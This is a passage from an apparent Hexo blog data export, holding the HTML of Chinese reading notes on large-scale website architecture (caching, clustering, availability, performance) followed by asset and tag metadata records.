可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗外；还可以使不同应用复用共同的服务，便于业务功能扩展</li><li>分布式静态资源：网站的静态资源例如js、css、image等静态资源可以独立分布部署，并采用独立资源。可以减轻应用服务器压力</li><li>分布式数据及存储：单台机器无法提供海量存储</li><li>分布式计算：目前网站大部分使用Hadoop及其MapReduce分布式计算框架使用处理计算。</li><li>分布式配置，分布式锁，分布式文件等</li></ul><h4 id=\"集群\"><a href=\"#集群\" class=\"headerlink\" title=\"集群\"></a>集群</h4><p>多台服务器可成一个集群，通过负载均衡对外提供服务，通过负载均衡新增或更替机器</p><h4 id=\"缓存\"><a href=\"#缓存\" class=\"headerlink\" title=\"缓存\"></a>缓存</h4><p>缓存就是将数据存放在距离计算最近的位置以加快处理速度。缓存是改善软件性能的第一手段</p><ul><li>CDN：可以缓存一些较少变化数据，如视频文件等，可以就近迅速返还给用户</li><li>反向代理：当用户请求到达中心时，最先访问反向代理服务器，这里缓存的是静态资源，无需转应用服务器就可返回给用户</li><li>本地缓存：缓存着热点数据，无需访问数据库直接可以取到，相比缓存服务器更迅速</li><li>分布式缓存：网站数据十分庞大时，本地缓存无法解决问题。</li></ul><p>使用缓存有两个前提条件，一是数据访问热点不均衡，某些数据会被更频繁的访问，这些数据应该放在缓存中；二是数据在某个时间段内有效，不会很快过期，否则缓存的数据就会因已经失效而产生脏读，影响结果的正确性</p><h4 id=\"异步\"><a href=\"#异步\" class=\"headerlink\" title=\"异步\"></a>异步</h4><ul><li>提高系统可用性：消费者服务器发生故障，数据会在消息队列服务器中存储堆积，生产者服务器可以继续处理业务请求，系统整体表现无故障</li><li>加快网站响应速度：处理完业务数据请求后，不需要等待消费者服务器处理就可以返回，直接写入消息队列，响应延迟减少</li><li>消除并发高峰：将请求放入消息队列中依次处理，就不对对整个网站负载造成过大压力</li></ul><h4 id=\"冗余\"><a href=\"#冗余\" class=\"headerlink\" title=\"冗余\"></a>冗余</h4><p>网站应该实现数据的冷备份外，还有热备份。即定时保存和实时保存数据，以及灾备数据中心。避免由于单个服务器损坏后数据损坏。</p><h4 id=\"自动化\"><a href=\"#自动化\" class=\"headerlink\" title=\"自动化\"></a>自动化</h4><p>网站发布应该具备以下环节</p><ul><li>发布自动化</li><li>代码管理：版本控制</li><li>自动化测试：自动检测并发送检测报告</li><li>自动化安全检测：对代码进行静态安全扫描部署及攻击测试</li><li>自动化部署：自动部署到生产环境</li><li>自动化监控：监控服务器宕机，程序bug，存储空间不足，突然访问高峰</li><li>自动化报警：超出阈值发送邮件报警</li><li>自动化失效转移：将失效的服务器从集群隔离</li><li>自动化失效恢复：重新启动服务</li><li>自动化降级：访问高峰则关闭次要服务</li><li>自动化分配资源：将空闲资源合理分配给重要任务</li></ul><h4 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h4><ul><li>密码和手机校验</li><li>通信加密</li><li>验证码识别</li><li>敏感词汇过滤</li><li>风险信息控制</li></ul><h2 id=\"架构要素\"><a href=\"#架构要素\" class=\"headerlink\" title=\"架构要素\"></a>架构要素</h2><p>通俗说法：最高层次的规划，难以改变的决定</p><p>一般说来，除了当前的系统功能需求外，软件架构还需要关注性能、可用性、伸缩性、扩展性和安全性这5个架构要素</p><ul><li>性能：衡量网站性能有一系列指标，重要的有响应时间、TPS、系统性能计数器等</li><li>可用性：大型网站至少到99.99%，衡量一个系统架构设计是否满足高可用的目标，就是假设系统中任何一台或者多台服务器宕机时，以及出现各种不可预期的问题时，系统整体是否依然可用</li><li>伸缩性：衡量架构伸缩性的主要标准就是是否可以用多台服务器构建集群，是否容易向集群中添加新的服务器。加入新的服务器后是否可以提供和原来的服务器无差别的服务。集群中可容纳的总的服务器数量是否有限制</li><li>扩展性：衡量网站架构扩展性好坏的主要标准就是在网站增加新的业务产品时，是否可以实现对现有产品透明无影响，不需要任何改动或者很少改动既有业务功能就可以上线新产品</li><li>安全性：衡量网站安全架构的标准就是针对现存和潜在的各种攻击与窃密手段，是否有可靠的应对策略</li></ul><h2 id=\"网站的高性能架构\"><a href=\"#网站的高性能架构\" class=\"headerlink\" title=\"网站的高性能架构\"></a>网站的高性能架构</h2><h4 id=\"不同视角下的性能\"><a href=\"#不同视角下的性能\" class=\"headerlink\" title=\"不同视角下的性能\"></a>不同视角下的性能</h4><ul><li>用户视角的网站性能：从用户角度，网站性能就是用户在浏览器上直观感受到的网站响应速度快还是慢。用户感受到的时间，包括用户计算机和网站服务器通信的时间、网站服务器处理的时间、用户计算机浏览器构造请求解析响应数据的时间</li><li>开发人员角度的网站性能：是应用程序本身及其相关子系统的性能，包括响应延迟、系统吞吐量、并发处理能力、系统稳定性等技术指标。主要的优化手段有使用缓存加速数据读取，使用集群提高吞吐能力，使用异步消息加快请求响应及实现削峰，使用代码优化手段改善程序性能</li><li>运维角度的网站性能：关注基础设施性能和资源利用率，如网络运营商的带宽能力、服务器硬件的配置、数据中心网络架构、服务器和网络带宽的资源利用率等。主要优化手段有建设优化骨干网、使用高性价比定制服务器、利用虚拟化技术优化资源利用等</li></ul><h4 id=\"性能优化策略\"><a href=\"#性能优化策略\" class=\"headerlink\" title=\"性能优化策略\"></a>性能优化策略</h4><ul><li>性能分析：检查请求处理的各个环节的日志，分析哪个环节响应时间不合理、超过预期；然后检查监控数据，分析影响性能的主要因素是内存、磁盘、网络、还是CPU，是代码问题还是架构设计不合理</li><li>性能优化：根据分层架构可分为web前端优化、应用服务器性能优化、存储服务器性能优化</li></ul><h4 id=\"前端优化策略\"><a href=\"#前端优化策略\" class=\"headerlink\" title=\"前端优化策略\"></a>前端优化策略</h4><ul><li>减少http请求</li><li>使用浏览器缓存</li><li>启动压缩</li><li>css放在最上面，js放在页面最下面</li><li>减少cookie传输</li></ul><h4 id=\"CDN加速\"><a href=\"#CDN加速\" class=\"headerlink\" title=\"CDN加速\"></a>CDN加速</h4><p>CDN能够缓存的一般是静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文件访问频度很高，将其缓存在CDN可极大改善网页的打开速度</p><h4 id=\"反向代理\"><a href=\"#反向代理\" class=\"headerlink\" title=\"反向代理\"></a>反向代理</h4><p>传统代理服务器位于浏览器一侧，代理浏览器将HTTP请求发送到互联网上，而反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求</p><h4 id=\"缓存-1\"><a href=\"#缓存-1\" class=\"headerlink\" title=\"缓存\"></a>缓存</h4><ul><li>基本原理： K-V形式存储</li><li>合理使用缓存：数据读写比2:1以上使用缓存才有意义</li><li>数据不一致与脏读：需要设置缓存时间，在缓存时间内可接受脏读</li><li>缓存可用性：数据库在面临缓存失效时容易出现访问过大导致宕机</li><li>缓存预热：提前加载缓存保证缓存可用</li><li>缓存穿透：将value为null的情况也加载在缓存中</li></ul><h4 id=\"代码优化\"><a href=\"#代码优化\" class=\"headerlink\" title=\"代码优化\"></a>代码优化</h4><ul><li>多线程：使用多线程处理IO与多cpu一般算法：多线程数=[任务执行时间/(任务执行时间-IO等待时间)]* cpu内核数量</li><li>将对象设计成无状态：在多并发时对象不会因多线程导致状态改变</li><li>使用局部对象：在方法内创建对象</li><li>并发访问使用锁：锁将并发操作转化为顺序操作</li><li>资源复用：使用单例模式和对象池</li><li>数据结构：使用数据结构+算法的形式优化代码可以极大的优化性能</li><li>垃圾回收：垃圾回收机制有利于性能提升</li></ul><h2 id=\"网站高可用架构\"><a href=\"#网站高可用架构\" class=\"headerlink\" title=\"网站高可用架构\"></a>网站高可用架构</h2><h4 id=\"网站高可用性度量\"><a href=\"#网站高可用性度量\" class=\"headerlink\" title=\"网站高可用性度量\"></a>网站高可用性度量</h4><p>网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点</p><p>网站年度可用性指标=（1-网站不可用时间/年度总时间）×100%</p><p>对于大多数网站而言，2个9是基本可用，网站年度不可用时间小于88小时；3个9是较高可用，网站年度不可用时间小于9小时；4个9是具有自动恢复能力的高可用，网站年度不可用时间小于53分钟；5个9是极高可用性，网站年度不可用时间小于5分钟。</p><h4 id=\"网站可用性考核\"><a href=\"#网站可用性考核\" class=\"headerlink\" title=\"网站可用性考核\"></a>网站可用性考核</h4><p><img src=\"/随笔/《大型网站技术架》读书笔记/useWeight.jpeg\" alt=\"考核\"></p><p>故障分=故障时间（分钟）× 故障权重</p><h4 id=\"高可用的服务\"><a href=\"#高可用的服务\" class=\"headerlink\" title=\"高可用的服务\"></a>高可用的服务</h4><ul><li>服务器分级：将服务器分不同级别，核心应用和服务优先使用更好的服务器</li><li>超时设置：由于宕机或死锁等其他情况，超时后可设置调度到其他服务器</li><li>异步调用：异步调用减少服务器压力</li><li>服务降级：高峰期使用服务器降级，拒绝服务（拒绝部分请求）或关闭服务（关闭非核心服务）</li><li>幂等性设计：服务层必须保证多次调用和一次调用结果一致</li></ul><h4 id=\"数据可用性\"><a href=\"#数据可用性\" class=\"headerlink\" title=\"数据可用性\"></a>数据可用性</h4><ul><li>数据持久性： 多个副本，在某个存储出错后数据不会丢失</li><li>数据可访问性：切换数据源时用户无感知</li><li>数据一致性：不同副本保证数据一致</li></ul><h4 id=\"网站运行监控\"><a href=\"#网站运行监控\" class=\"headerlink\" title=\"网站运行监控\"></a>网站运行监控</h4><p>不允许没有监控的系统上线</p><ul><li>用户行为日志收集</li><li>服务器端日志收集</li><li>客户端浏览器日志收集</li><li>服务器性能监控</li><li>运行数据报告</li></ul><h5 id=\"小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\"><a href=\"#小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\" class=\"headerlink\" title=\"小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\"></a>小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。</h5>"}],"PostAsset":[{"_id":"source/_posts/basic-cookies/out-path-cookie.png","slug":"out-path-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","modified":1,"renderable":0},{"_id":"source/_posts/best-practice-of-decorator/xmind.png","slug":"xmind.png","post":"ckuq8nz01000j4jzxyemftxqd","modified":1,"renderable":0},{"_id":"source/_posts/git-rebase-merge-commit/modify-commit-message.png","slug":"modify-commit-message.png","post":"ckuq8nz04000n4jzxorx5aqgi","modified":1,"renderable":0},{"_id":"source/_posts/the-skills-of-develop/discuss.png","slug":"discuss.png","post":"ckuq8nz0800174jzxif3vfysp","modified":1,"renderable":0},{"_id":"source/_posts/the-skills-of-develop/gantt-chart.png","slug":"gantt-chart.png","post":"ckuq8nz0800174jzxif3vfysp","modified":1,"renderable":0},{"_id":"source/_posts/basic-cookies/font-transfer-cookie.png","slug":"font-transfer-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","modified":1,"renderable":0},{"_id":"source/_posts/basic-cookies/unlogin-cookie.png","slug":"unlogin-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","modified":1,"renderable":0},{"_id":"source/_posts/git-rebase-merge-commit/modified-git-log.png","slug":"modified-git-log.png","post":"ckuq8nz04000n4jzxorx5aqgi","modified":1,"renderable":0},{"_id":"source/_posts/2017-ele-Interecommunions/eleTalking.jpg","slug":"eleTalking.jpg","post":"ckuq8nyzs00014jzxgmaxnbw1","modified":1,"renderable":0},{"_id":"source/_posts/basic-computer-sience-chapter4/elfImage.jpg","post":"ckuq8nz00000e4jzxsdmbtt35","slug":"elfImage.jpg","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter5/simpleBus.jpg","post":"ckuq8nz00000f4jzxebj340o8","slug":"simpleBus.jpg","modified":1,"renderable":1},{"_id":"source/_posts/computer-network-chapter2/computer_internet.png","post":"ckuq8nz05000t4jzx2pwqrrjj","slug":"computer_internet.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-3/nestjs.png","post":"ckuq8nz05000v4jzxs81gzqia","slug":"nestjs.png","modified":1,"renderable":1},{"_id":"source/_posts/read-javascript-again-chapter4/heapObject.png","post":"ckuq8nz0700114jzxz6x0cwsw","slug":"heapObject.png","modified":1,"renderable":1},{"_id":"source/_posts/the-mythical-man-month/mythical-team.jpeg","post":"ckuq8nz0a001e4jzxyy9btqin","slug":"mythical-team.jpeg","modified":1,"renderable":1},{"_id":"source/_posts/what-is-sse/sse-header.png","post":"ckuq8nz0a001g4jzxbh17edrw","slug":"sse-header.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-middle-summary/me-with-my-girl.jpg","post":"ckuq8nyzx00064jzxfczzx1no","slug":"me-with-my-girl.jpg","modified":1,"renderable":1},{"_id":"source/_posts/2021-middle-summary/me.jpg","post":"ckuq8nyzx00064jzxfczzx1no","slug":"me.jpg","modified":1,"renderable":1},{"_id":"source/_posts/font-end-optimize/font-end-cache.png","post":"ckuq8nz03000l4jzx9gw0x6zq","slug":"font-end-cache.png","modified":1,"renderable":1},{"_id":"source/_posts/font-end-optimize/page-process.png","post":"ckuq8nz03000l4jzx9gw0x6zq","slug":"page-process.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-2/log.png","slug":"log.png","post":"ckuq8nz06000z4jzxyiwp11js","modified":1,"renderable":0},{"_id":"source/_posts/nest-js-tutorial-2/nestjs.png","post":"ckuq8nz06000z4jzxyiwp11js","slug":"nestjs.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter2/IEEE754_chart.jpg","post":"ckuq8nyzy00094jzxr5rizasr","slug":"IEEE754_chart.jpg","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter2/choiceTwoWay.jpg","post":"ckuq8nyzy00094jzxr5rizasr","slug":"choiceTwoWay.jpg","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter2/ieee754image.png","post":"ckuq8nyzy00094jzxr5rizasr","slug":"ieee754image.png","modified":1,"renderable":1},{"_id":"source/_posts/the-skills-of-develop/xmind.png","post":"ckuq8nz0800174jzxif3vfysp","slug":"xmind.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-1/controllers.png","post":"ckuq8nz04000p4jzxay8zguei","slug":"controllers.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-1/module.png","post":"ckuq8nz04000p4jzxay8zguei","slug":"module.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-1/nestjs.png","post":"ckuq8nz04000p4jzxay8zguei","slug":"nestjs.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-1/nodejs.png","post":"ckuq8nz04000p4jzxay8zguei","slug":"nodejs.png","modified":1,"renderable":1},{"_id":"source/_posts/use-dhcp/dhcp_client.png","post":"ckuq8nz0a001j4jzxbja0pecd","slug":"dhcp_client.png","modified":1,"renderable":1},{"_id":"source/_posts/use-dhcp/dhcp_config1.gif","post":"ckuq8nz0a001j4jzxbja0pecd","slug":"dhcp_config1.gif","modified":1,"renderable":1},{"_id":"source/_posts/use-dhcp/dhcp_config2.gif","post":"ckuq8nz0a001j4jzxbja0pecd","slug":"dhcp_config2.gif","modified":1,"renderable":1},{"_id":"source/_posts/use-dhcp/dhcp_config3.gif","post":"ckuq8nz0a001j4jzxbja0pecd","slug":"dhcp_config3.gif","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-4/guards.png","post":"ckuq8nz0700154jzx9jltxdtf","slug":"guards.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-4/interceptors.png","post":"ckuq8nz0700154jzx9jltxdtf","slug":"interceptors.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-4/nestjs.png","post":"ckuq8nz0700154jzx9jltxdtf","slug":"nestjs.png","modified":1,"renderable":1},{"_id":"source/_posts/nest-js-tutorial-4/pipes.png","post":"ckuq8nz0700154jzx9jltxdtf","slug":"pipes.png","modified":1,"renderable":1},{"_id":"source/_posts/《大型网站技术架》读书笔记/hierarchy.jpeg","post":"ckuq8nz0d001x4jzxme0mwzma","slug":"hierarchy.jpeg","modified":1,"renderable":1},{"_id":"source/_posts/《大型网站技术架》读书笔记/useWeight.jpeg","post":"ckuq8nz0d001x4jzxme0mwzma","slug":"useWeight.jpeg","modified":1,"renderable":1},{"_id":"source/_posts/《大型网站技术架》读书笔记/websiteDisAppAndUseTec.jpeg","post":"ckuq8nz0d001x4jzxme0mwzma","slug":"websiteDisAppAndUseTec.jpeg","modified":1,"renderable":1},{"_id":"source/_posts/《大型网站技术架》读书笔记/websiteInit.jpeg","post":"ckuq8nz0d001x4jzxme0mwzma","slug":"websiteInit.jpeg","modified":1,"renderable":1},{"_id":"source/_posts/git-rebase-merge-commit/git-log.png","slug":"git-log.png","post":"ckuq8nz04000n4jzxorx5aqgi","modified":1,"renderable":0},{"_id":"source/_posts/git-rebase-merge-commit/git-rebase-pick.png","slug":"git-rebase-pick.png","post":"ckuq8nz04000n4jzxorx5aqgi","modified":1,"renderable":0},{"_id":"source/_posts/git-rebase-merge-commit/git-rebase-s.png","slug":"git-rebase-s.png","post":"ckuq8nz04000n4jzxorx5aqgi","modified":1,"renderable":0},{"_id":"source/_posts/basic-computer-sience-chapter3/eflagRegister.png","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"eflagRegister.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter3/findWay.png","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"findWay.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter3/flagRegister.gif","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"flagRegister.gif","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter3/purposeRegisters.jpg","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"purposeRegisters.jpg","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter3/sliceRegister.jpg","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"sliceRegister.jpg","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter3/stackBP.jpg","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"stackBP.jpg","modified":1,"renderable":1},{"_id":"source/_posts/basic-computer-sience-chapter3/stackValue.png","post":"ckuq8nyzw00054jzxwv5kmynd","slug":"stackValue.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-cookies/after-check-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","slug":"after-check-cookie.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-cookies/before-check-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","slug":"before-check-cookie.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-cookies/exchange-cookies.png","post":"ckuq8nz01000i4jzxbifvpztm","slug":"exchange-cookies.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-cookies/in-path-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","slug":"in-path-cookie.png","modified":1,"renderable":1},{"_id":"source/_posts/basic-cookies/login-cookie.png","slug":"login-cookie.png","post":"ckuq8nz01000i4jzxbifvpztm","modified":1,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"ckuq8nyzs00014jzxgmaxnbw1","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nyzy00084jzxq7qacktv"},{"post_id":"ckuq8nyzx00064jzxfczzx1no","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nyzz000a4jzxy65wu4mt"},{"post_id":"ckuq8nyzu00024jzxjebdrytf","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nz00000d4jzx1o180aq0"},{"post_id":"ckuq8nyzw00044jzxkp36yg8i","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nz01000h4jzx9t25nt6y"},{"post_id":"ckuq8nyzw00054jzxwv5kmynd","tag_id":"ckuq8nz01000g4jzxa559krbb","_id":"ckuq8nz04000m4jzxyef5rk1j"},{"post_id":"ckuq8nyzy00094jzxr5rizasr","tag_id":"ckuq8nz01000g4jzxa559krbb","_id":"ckuq8nz04000q4jzxs2p0gqkh"},{"post_id":"ckuq8nyzz000b4jzx5n2ekzma","tag_id":"ckuq8nz04000o4jzxewmuzkws","_id":"ckuq8nz05000u4jzxek0jtz44"},{"post_id":"ckuq8nz00000e4jzxsdmbtt35","tag_id":"ckuq8nz01000g4jzxa559krbb","_id":"ckuq8nz06000y4jzx4sc7p3tx"},{"post_id":"ckuq8nz00000f4jzxebj340o8","tag_id":"ckuq8nz01000g4jzxa559krbb","_id":"ckuq8nz0700124jzxb2c8y1r3"},{"post_id":"ckuq8nz01000i4jzxbifvpztm","tag_id":"ckuq8nz0600104jzx9vj1s60e","_id":"ckuq8nz0800164jzxqdjo1oej"},{"post_id":"ckuq8nz01000j4jzxyemftxqd","tag_id":"ckuq8nz0700144jzx2dl64j3s","_id":"ckuq8nz09001a4jzxid1uqxxh"},{"post_id":"ckuq8nz03000l4jzx9gw0x6zq","tag_id":"ckuq8nz0900194jzxlzidhg22","_id":"ckuq8nz0a001f4jzxpzzru43z"},{"post_id":"ckuq8nz09001c4jzxt69my2nr","tag_id":"ckuq8nz0600104jzx9vj1s60e","_id":"ckuq8nz0a001h4jzx03cwxd7m"},{"post_id":"ckuq8nz0a001e4jzxyy9btqin","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nz0b001k4jzxl3jloqk5"},{"post_id":"ckuq8nz04000n4jzxorx5aqgi","tag_id":"ckuq8nz0a001d4jzxokrjsdsq","_id":"ckuq8nz0b001m4jzxovcffngq"},{"post_id":"ckuq8nz0b001l4jzxhtgbx9tu","tag_id":"ckuq8nz0600104jzx9vj1s60e","_id":"ckuq8nz0b001p4jzxydbpouvu"},{"post_id":"ckuq8nz0b001o4jzxpbdew2wo","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nz0c001r4jzxvb667jvd"},{"post_id":"ckuq8nz0b001q4jzxen1rv2cr","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0c001u4jzxuxxd4x8n"},{"post_id":"ckuq8nz0c001t4jzx0lzw99rk","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0d001w4jzxyk8hj2nt"},{"post_id":"ckuq8nz0c001v4jzxe10w6p6m","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0d001z4jzxadqfga3v"},{"post_id":"ckuq8nz04000p4jzxay8zguei","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0d00204jzxf8x0mhx3"},{"post_id":"ckuq8nz04000p4jzxay8zguei","tag_id":"ckuq8nz0700144jzx2dl64j3s","_id":"ckuq8nz0d00224jzxxmdfolng"},{"post_id":"ckuq8nz04000p4jzxay8zguei","tag_id":"ckuq8nz0c001s4jzxyx7in1w2","_id":"ckuq8nz0d00234jzxwgvqwga7"},{"post_id":"ckuq8nz0d001x4jzxme0mwzma","tag_id":"ckuq8nyzv00034jzxnyhvo822","_id":"ckuq8nz0d00254jzxoxjllzn3"},{"post_id":"ckuq8nz05000r4jzxjnoy5hbk","tag_id":"ckuq8nz0d001y4jzxwuxw81st","_id":"ckuq8nz0d00264jzxzu6a4fw7"},{"post_id":"ckuq8nz05000t4jzx2pwqrrjj","tag_id":"ckuq8nz0d00214jzx9hc3gphm","_id":"ckuq8nz0e00284jzxoonmt58t"},{"post_id":"ckuq8nz05000v4jzxs81gzqia","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0e002b4jzxfm42mwh8"},{"post_id":"ckuq8nz05000v4jzxs81gzqia","tag_id":"ckuq8nz0700144jzx2dl64j3s","_id":"ckuq8nz0e002c4jzx5q1mrsam"},{"post_id":"ckuq8nz05000v4jzxs81gzqia","tag_id":"ckuq8nz0c001s4jzxyx7in1w2","_id":"ckuq8nz0e002e4jzx1audnp6f"},{"post_id":"ckuq8nz06000x4jzxgdj30cc9","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0e002f4jzxsxr405kb"},{"post_id":"ckuq8nz06000z4jzxyiwp11js","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0f002j4jzxblys3b6i"},{"post_id":"ckuq8nz06000z4jzxyiwp11js","tag_id":"ckuq8nz0700144jzx2dl64j3s","_id":"ckuq8nz0f002k4jzxd6pgnbwz"},{"post_id":"ckuq8nz06000z4jzxyiwp11js","tag_id":"ckuq8nz0c001s4jzxyx7in1w2","_id":"ckuq8nz0f002m4jzxkv6hy9kc"},{"post_id":"ckuq8nz0700114jzxz6x0cwsw","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0f002n4jzxxvvio9ly"},{"post_id":"ckuq8nz0700134jzx3qkfrdbr","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0f002p4jzxut63pq6b"},{"post_id":"ckuq8nz0700154jzx9jltxdtf","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0g002t4jzxlb1zse6e"},{"post_id":"ckuq8nz0700154jzx9jltxdtf","tag_id":"ckuq8nz0700144jzx2dl64j3s","_id":"ckuq8nz0g002u4jzxryk3t1k7"},{"post_id":"ckuq8nz0700154jzx9jltxdtf","tag_id":"ckuq8nz0c001s4jzxyx7in1w2","_id":"ckuq8nz0g002w4jzx3iqjnmit"},{"post_id":"ckuq8nz0800174jzxif3vfysp","tag_id":"ckuq8nz0g002s4jzxgcf0q4h5","_id":"ckuq8nz0g002x4jzxzl3lmrba"},{"post_id":"ckuq8nz0900184jzxinr80d08","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0g002z4jzx0tpd49io"},{"post_id":"ckuq8nz09001b4jzxg5sg7gvx","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0h00314jzxc2lzejg1"},{"post_id":"ckuq8nz0a001g4jzxbh17edrw","tag_id":"ckuq8nz0a001i4jzxcljjk9xm","_id":"ckuq8nz0h00344jzx9b78ltar"},{"post_id":"ckuq8nz0a001g4jzxbh17edrw","tag_id":"ckuq8nz0h00324jzxvzjy6m16","_id":"ckuq8nz0h00354jzxmhez373w"},{"post_id":"ckuq8nz0a001g4jzxbh17edrw","tag_id":"ckuq8nz0600104jzx9vj1s60e","_id":"ckuq8nz0h00364jzx8d9eo1t1"},{"post_id":"ckuq8nz0a001j4jzxbja0pecd","tag_id":"ckuq8nz0h00334jzx2k1w8tjq","_id":"ckuq8nz0h00374jzx3nxworzc"}],"Tag":[{"name":"随笔","_id":"ckuq8nyzv00034jzxnyhvo822"},{"name":"计算机系统基础","_id":"ckuq8nz01000g4jzxa559krbb"},{"name":"code","_id":"ckuq8nz04000o4jzxewmuzkws"},{"name":"http","_id":"ckuq8nz0600104jzx9vj1s60e"},{"name":"typescript","_id":"ckuq8nz0700144jzx2dl64j3s"},{"name":"前端","_id":"ckuq8nz0900194jzxlzidhg22"},{"name":"git","_id":"ckuq8nz0a001d4jzxokrjsdsq"},{"name":"javascript","_id":"ckuq8nz0a001i4jzxcljjk9xm"},{"name":"nestJs","_id":"ckuq8nz0c001s4jzxyx7in1w2"},{"name":"ncuhome","_id":"ckuq8nz0d001y4jzxwuxw81st"},{"name":"计算机网络","_id":"ckuq8nz0d00214jzx9hc3gphm"},{"name":"需求开发","_id":"ckuq8nz0g002s4jzxgcf0q4h5"},{"name":"nodejs","_id":"ckuq8nz0h00324jzxvzjy6m16"},{"name":"linux","_id":"ckuq8nz0h00334jzx2k1w8tjq"}]}}